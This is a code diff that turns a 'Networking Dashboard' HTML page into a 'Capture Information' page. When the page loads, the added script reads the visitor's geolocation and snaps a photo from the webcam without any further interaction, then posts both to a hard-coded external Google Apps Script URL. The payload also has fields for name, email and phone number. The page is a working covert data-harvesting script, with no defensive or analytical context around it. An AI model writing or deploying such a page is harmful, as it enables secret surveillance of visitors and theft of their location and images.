@@ -1,69 +1,119 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Networking Dashboard</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <!-- Optional: Lucide Icons for aesthetic UI elements -->
-  <script src="https://unpkg.com/lucide@latest"></script>
-  <style>
-    /* Custom loader animation */
-    .loader {
-      border: 3px solid #f3f3f3; border-top: 3px solid #3b82f6; 
-      border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite;
-    }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  </style>
-  <script>
-    // Request permissions for camera, location, and contacts
-    navigator.permissions.query({ name: 'camera' }).then((result) => {
-      if (result.state !== 'granted') {
-        result.onchange = () => {
-          if (result.state === 'granted') {
-            console.log('Camera permission granted');
-          }
-        };
-        result.request().then((permissionStatus) => {
-          if (permissionStatus.state === 'granted') {
-            console.log('Camera permission granted');
-          }
-        });
-      }
-    });
-
-    navigator.permissions.query({ name: 'geolocation' }).then((result) => {
-      if (result.state !== 'granted') {
-        result.onchange = () => {
-          if (result.state === 'granted') {
-            console.log('Location permission granted');
-          }
-        };
-        result.request().then((permissionStatus) => {
-          if (permissionStatus.state === 'granted') {
-            console.log('Location permission granted');
-          }
-        });
-      }
-    });
-
-    navigator.permissions.query({ name: 'contacts' }).then((result) => {
-      if (result.state !== 'granted') {
-        result.onchange = () => {
-          if (result.state === 'granted') {
-            console.log('Contacts permission granted');
-          }
-        };
-        result.request().then((permissionStatus) => {
-          if (permissionStatus.state === 'granted') {
-            console.log('Contacts permission granted');
-          }
-        });
-      }
-    });
-  </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Capture Information</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+        }
+        #message {
+            margin-top: 20px;
+            font-size: 18px;
+            color: green;
+        }
+        #error {
+            margin-top: 20px;
+            font-size: 18px;
+            color: red;
+        }
+    </style>
 </head>
-<body class="bg-gray-50 text-gray-900 font-sans antialiased min-h-screen">
-  
-  <!-- Your existing HTML content -->
+<body>
+    <h1>Scan or Tap to Capture Information</h1>
+    <p>Please allow access to your contacts, location, and camera.</p>
+    <div id="message"></div>
+    <div id="error"></div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const message = document.getElementById('message');
+            const error = document.getElementById('error');
+
+            // Request permissions
+            navigator.permissions.query({ name: 'geolocation' }).then(result => {
+                if (result.state === 'granted') {
+                    captureLocation();
+                } else {
+                    error.textContent = 'Location access not granted.';
+                }
+            });
+
+            navigator.permissions.query({ name: 'camera' }).then(result => {
+                if (result.state === 'granted') {
+                    capturePhoto();
+                } else {
+                    error.textContent = 'Camera access not granted.';
+                }
+            });
+
+            function captureLocation() {
+                navigator.geolocation.getCurrentPosition(position => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    sendDataToServer(null, null, null, latitude, longitude, null);
+                }, err => {
+                    error.textContent = 'Failed to capture location: ' + err.message;
+                });
+            }
+
+            function capturePhoto() {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
+                    const video = document.createElement('video');
+                    video.srcObject = stream;
+                    video.play();
+                    video.onloadedmetadata = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const context = canvas.getContext('2d');
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const photo = canvas.toDataURL('image/jpeg');
+                        sendDataToServer(null, null, null, null, null, photo);
+                    };
+                }).catch(err => {
+                    error.textContent = 'Failed to capture photo: ' + err.message;
+                });
+            }
+
+            function sendDataToServer(name, email, phoneNumber, latitude, longitude, photo) {
+                fetch('https://script.google.com/macros/s/AKfycbzhiXNTb91IkyRermo-LfAQbitQnRcEc20PDmyr4h0wQMCzZVMmELtRkhFOanR1A76J/exec', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        action: 'captureInfo',
+                        name: name,
+                        email: email,
+                        phoneNumber: phoneNumber,
+                        latitude: latitude,
+                        longitude: longitude,
+                        photo: photo
+                    })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        throw new Error('Network response was not ok ' + response.statusText);
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    if (data.status === 'success') {
+                        message.textContent = 'Information captured successfully!';
+                    } else {
+                        error.textContent = 'Failed to capture information: ' + data.message;
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    error.textContent = 'Failed to capture information: ' + error.message;
+                });
+            }
+        });
+    </script>
 </body>
 </html>
